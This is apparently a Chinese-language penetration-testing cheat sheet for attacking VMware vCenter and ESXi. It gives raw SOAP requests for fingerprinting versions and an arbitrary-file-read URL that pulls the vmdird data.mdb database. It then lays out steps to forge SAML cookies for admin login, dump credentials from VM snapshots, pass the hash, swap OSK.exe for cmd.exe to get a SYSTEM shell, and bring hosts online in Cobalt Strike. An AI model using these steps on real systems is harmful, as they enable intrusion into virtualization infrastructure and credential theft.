### 0x01-VMware vCenter查看版本
```
text
POST /sdk HTTP/2
Host: 172.18.2.62
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 335
Te: trailers
Connection: close

<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<env:Body>
<RetrieveServiceContent xmlns="urn:vim25">
<_this type="ServiceInstance">ServiceInstance</_this>
</RetrieveServiceContent>
</env:Body>
</env:Envelope>
```

### 0x02-VMware ESXi查看版本
```
text
POST /sdk HTTP/1.1
Host: 10.10.15.4
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 335
Te: trailers
Connection: close

<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<env:Body>
<RetrieveServiceContent xmlns="urn:vim25">
<_this type="ServiceInstance">ServiceInstance</_this>
</RetrieveServiceContent>
</env:Body>
</env:Envelope>
```

### 0x03-任意文件读取到登录后台
```
text
Linux
/storage/db/vmware-vmdir/data.mdb

Windows
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb

例子
https://10.8.12.170/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb

通过vcenter_saml_login提取cookie

替换cookie登录后台
```

### 0x04-漏洞利用到登录后台
```
text
漏洞利用拿到shell

通过vcenter_saml_login提取cookie

替换cookie登录后台
```

### 0x05-登录后台到拿下虚拟机
```
text
可通过vcenter的快照功能获取虚拟机的快照，然后通过内存取证的姿势dump凭证，pth；

也可传到本地，再恢复成虚拟机，然后通过PE，重命名CMD.EXE为OSK.exe覆盖原OSK.exe，此时
开机打开屏幕键盘会弹出SYSTEM权限的命令行窗口，本地上线cs然后hashdump抓取凭证，pth即
可。（by banliz1）
```

### 参考链接
https://github.com/pen4uin/pentest-note/blob/main/README.md#内网-vsphere--vcenter的后利用姿势  
https://github.com/horizon3ai/vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login  